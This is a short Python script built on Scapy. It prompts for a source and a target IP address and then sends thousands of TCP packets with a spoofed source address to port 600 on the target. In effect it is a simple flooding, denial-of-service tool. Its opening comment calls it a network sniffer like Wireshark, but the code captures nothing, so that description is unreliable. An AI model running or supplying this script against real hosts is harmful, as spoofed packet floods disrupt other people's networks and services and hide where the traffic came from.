#!/usr/bin/python3

# Network sniffer using Scapy, similar to wireshark 

# Import modules

from scapy.all import * 

# Function to generate packets 
def floodz(source, target):
    for source_p in range(100,5000):
        IPlayer = IP(src=source, dst=target)
        TCPlayer = TCP(sport=source_p, dport=600)
        pkt = IPlayer/TCPlayer
        send(pkt)

# user input to provide source and target IP addresses
source = input("\nEnter Source IP of your choice: \n")
target = input("\nTarget IP Address: \n")
floodz(source,target)
